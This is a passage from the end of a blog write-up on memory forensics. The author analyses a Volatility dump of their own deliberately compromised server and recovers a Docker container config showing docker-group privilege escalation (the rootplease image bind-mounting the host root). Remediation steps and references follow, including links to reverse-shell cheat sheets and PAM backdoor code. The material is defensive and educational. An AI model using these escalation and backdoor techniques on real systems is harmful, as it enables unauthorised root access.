----------------                0x0 /bin/bin/usr/lib/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts-shm.mount.requires
----------------                0x0 /bin/bin/usr/lib/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts-shm.mount.wants
----------------                0x0 /bin/bin/usr/lib/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts-shm.mount
----------------                0x0 /bin/bin/etc/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts.mount
----------------                0x0 /bin/bin/etc/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d.mount
----------------                0x0 /bin/bin/etc/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts-shm.mount.d
----------------                0x0 /bin/bin/etc/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts-shm.mount.requires
----------------                0x0 /bin/bin/etc/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts-shm.mount.wants
----------------                0x0 /bin/bin/etc/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts-shm.mount

$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_find_file -i 0xffff9796439e5798 -O configv2.json

$ cat configv2.json
{
   "StreamConfig":{

   },
   "State":{
      "Running":false,
      "Paused":false,
      "Restarting":false,
      "OOMKilled":false,
      "RemovalInProgress":false,
      "Dead":false,
      "Pid":0,
      "ExitCode":0,
      "Error":"",
      "StartedAt":"2018-12-27T20:35:33.829072671Z",
      "FinishedAt":"2018-12-27T20:38:06.362580759Z",
      "Health":null
   },
   "ID":"7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d",
   "Created":"2018-12-27T20:35:33.445274287Z",
   "Managed":false,
   "Path":"/bin/bash",
   "Args":[
      "exploit.sh"
   ],
   "Config":{
      "Hostname":"7a61f3cd00b1",
      "Domainname":"",
      "User":"",
      "AttachStdin":true,
      "AttachStdout":true,
      "AttachStderr":true,
      "Tty":true,
      "OpenStdin":true,
      "StdinOnce":true,
      "Env":[
         "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
      ],
      "Cmd":[
         "/bin/bash",
         "exploit.sh"
      ],
      "Image":"chrisfosterelli/rootplease",
      "Volumes":null,
      "WorkingDir":"",
      "Entrypoint":null,
      "OnBuild":null,
      "Labels":{

      }
   },
   "Image":"sha256:0db941813769383d7ed3bdcccd27af1b6d7b47ed0fb33f1b47f7bb937529fa3e",
   "NetworkSettings":{
      "Bridge":"",
      "SandboxID":"f5255e73e83536c1ef71277f3341fdc91cdcd2bd22f759093140d8aa5eb16891",
      "HairpinMode":false,
      "LinkLocalIPv6Address":"",
      "LinkLocalIPv6PrefixLen":0,
      "Networks":{
         "bridge":{
            "IPAMConfig":null,
            "Links":null,
            "Aliases":null,
            "NetworkID":"0f3242d272897a68f74cdf971e44ef9e0e7ad108758cd8b72698327dcbb97343",
            "EndpointID":"",
            "Gateway":"",
            "IPAddress":"",
            "IPPrefixLen":0,
            "IPv6Gateway":"",
            "GlobalIPv6Address":"",
            "GlobalIPv6PrefixLen":0,
            "MacAddress":"",
            "DriverOpts":null,
            "IPAMOperational":false
         }
      },
      "Service":null,
      "Ports":null,
      "SandboxKey":"/var/run/docker/netns/f5255e73e835",
      "SecondaryIPAddresses":null,
      "SecondaryIPv6Addresses":null,
      "IsAnonymousEndpoint":true,
      "HasSwarmEndpoint":false
   },
   "LogPath":"/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-json.log",
   "Name":"/amazing_rosalind",
   "Driver":"overlay2",
   "OS":"linux",
   "MountLabel":"",
   "ProcessLabel":"",
   "RestartCount":0,
   "HasBeenStartedBefore":true,
   "HasBeenManuallyStopped":false,
   "MountPoints":{
      "/hostOS":{
         "Source":"/",
         "Destination":"/hostOS",
         "RW":true,
         "Name":"",
         "Driver":"",
         "Type":"bind",
         "Propagation":"rslave",
         "Spec":{
            "Type":"bind",
            "Source":"/",
            "Target":"/hostOS"
         },
         "SkipMountpointCreation":false
      }
   },
   "SecretReferences":null,
   "ConfigReferences":null,
   "AppArmorProfile":"",
   "HostnamePath":"/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/hostname",
   "HostsPath":"/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/hosts",
   "ShmPath":"/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/mounts/shm",
   "ResolvConfPath":"/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/resolv.conf",
   "SeccompProfile":"",
   "NoNewPrivileges":false
}
```

And that's the tragedy, Odie realizes that an unknown docker has been launched:

* Image: chrisfosterelli/rootplease
* Cmd: ["/bin/bash", "exploit.sh"]


![](https://media.giphy.com/media/3o72EYpwsVfqtqccpy/giphy.gif)


After requesting Google about a possibility of gaining __root__ access using docker, we found a dockerhub page that explain how your can abuse `docker` group: https://hub.docker.com/r/chrisfosterelli/rootplease/

Finally, the laziness of using sudo every time he needs to use docker will have gotten the better of our little Odie.

## Attack scenario

According to our analysis, here is the attacker scenario:


![](/lib/images/articles/realgsmoveinsilencelikelasagna/scenario_1.png)


## Action plan

Now that we have done a nice analysis, it's important to mitigate and fix vulnerabilities.

### Remediation

* Remove or move `/var/www/html/test.php` and `/var/www/html/config_test.php` files ;
* Removing __odie__ from `docker` group ;
* Removing the PAM backdoor of Monique and restore the legit PAM mechanism ;
* Remove old SSH key pair and generate new SSH keys for __odie__ ;
* Add a password on MySQL user __wp_mysql_user__ ;
* Allow __wp_mysql_user__ to manage only the WordPress database.

### Improvement

* Deport logs to avoid their deletion (voluntary or not). Odie is a good student, he listened to all his courses on Splunk. It will be easy for him ;
* Enable Apache2 POST requests logging ;
* Store commands runs by __www-data__ ;
* Change SSH default port ;
* Install an SSH honeypot on the default port.

# Conclusion

To conclude this article, I really enjoyed doing it, I learned a lot of things, whether it was in blue team or red team. The main problem is that my point of view was completely biased since I was both the attacker and the attacked. I should be looking for someone who attacks a machine, makes a memory dump and sends it to me.

Moreover, it's a new system, which has no experience and no interaction with the internet. This system is completely prevented from external noise. This is why to was so "easy" to find all these artifacts despite the completely poor log configuration.

Some omissions like the docker container for privilege escalation are not done on purpose, I really forgot to delete the container! I realized this during the analysis of the memory dump.

I hope you will have learned some things as readers, and that it will motivate you to do these kinds of little exercises and write about it :D



If you have any questions about this article, advice about the methodology (blue or/and red team) or even just for chatting, feel free to contact me on Twitter: [Maki Twitter](https://twitter.com/Maki_chaz).

Finally, I would like to be clear about the history between Monique and Odie. After all of that, Monique has stopped annoying Odie. They even going to see Aquaman together this weekend! They lived happily ever after and had many children! :)


![](https://media.giphy.com/media/lD76yTC5zxZPG/giphy.gif)


## Ressources

* Nick CONGLETON, _How to Install a LAMP Server on Debian 9 Stretch Linux_. 21/02/2018. __Linux Config__: https://linuxconfig.org/how-to-install-a-lamp-server-on-debian-9-stretch-linux
* Nick CONGLETON, _How to Install WordPress on Debian 9 Stretch Linux_. 30/06/2017. __Linux Config__: https://linuxconfig.org/how-to-install-wordpress-on-debian-9-stretch-linux
* xfkxfk@, _SSRF To RCE in MySQL_. 23/01/2018. __Seebug paper__: https://paper.seebug.org/510/
* Guilherme "k33r0k" Assmann, _ISITDTU CTF 2018 - Friss Writeup_. 29/07/2018. __FireShell Security team__: https://fireshellsecurity.team/isitdtu-friss/
* Officiel PHP website, _escapeshellarg_. __PHP__: http://php.net/manual/fr/function.escapeshellarg.php
* HollyGraceful, _Custom Rules for John the Ripper_. 14/09/2015. __GracefulSecurity__: https://www.gracefulsecurity.com/custom-rules-for-john-the-ripper/
* PentestMonkey, _Reverse Shell Cheat Sheet_. __PentestMonkey__: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
* RopNop, _Upgrading simple shells to fully interactive TTYs_. 10/07/2017. __RopNop blog__: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
* Python official website, _Command lind and environment_, __Python officiel website__: https://docs.python.org/2/using/cmdline.html#envvar-PYTHONINSPECT
* Chris Foster, _Privilege escalation via Docker_. 22/04/2015. __fosterelli__: https://fosterelli.co/privilege-escalation-via-docker.html
* Mitsurugi, _Creating a backdoor in PAM in 5 line of code_. 16/06/2016. __Mitsurugi blog__: http://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html
* Zephrax, _linux-pam-backdoor_. 2016. __GitHub__: https://github.com/zephrax/linux-pam-backdoor
* 504ensibsLabs, _LiME ~ Linux Memory Extractor_. 2018. __GitHub__: https://github.com/504ensicsLabs/LiME
* Maki, _Volatility docker_. 2018. __GitLab__: https://gitlab.com/Maki_chaz/infosec-docker/tree/master/forensic/volatility
* huntergregal, _Mimipenguin beta-2.0_. 2018. __GitHub__: https://github.com/huntergregal/mimipenguin
* gleeda, _Linux command reference_. 20/12/2017. __Volatility GitHub__: https://github.com/volatilityfoundation/volatility/wiki/Linux-Command-Reference
* Wiki, _OWASP DirBuster Project_. __OWASP Wiki__: https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
* Geluchat, _Les Server Side Request Forgery : Comment contourner un pare-feu_. 16/09/2017. __DailySecurity__: https://www.dailysecurity.fr/server-side-request-forgery/
* Swissky, _Server-Side Request Forgery_. __GitHub__: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SSRF%20injection/README.md
* DFarnier, _Débuter WordPress_. 01/03/2015. __dfarnier__: https://dfarnier.fr/base-de-donnees-wordpress-1/?nolazy#les-tables-des-utilisateurs-wp_users-et-wp_usermeta
* chrisfosterelli, _chrisfosterelli/rootplease_. 2015. __DockerHub__: https://hub.docker.com/r/chrisfosterelli/rootplease/
* cowrie, _Cowrie SSH/Telnet Honeypot_. 2018. __GitHub__: https://github.com/cowrie/cowrie
* SekioaLab, _FastIR Collector Linux_. 2017. __GitHub__: https://github.com/SekoiaLab/Fastir_Collector_Linux







































































































































































































































































































































































































































































































































































































































































































































































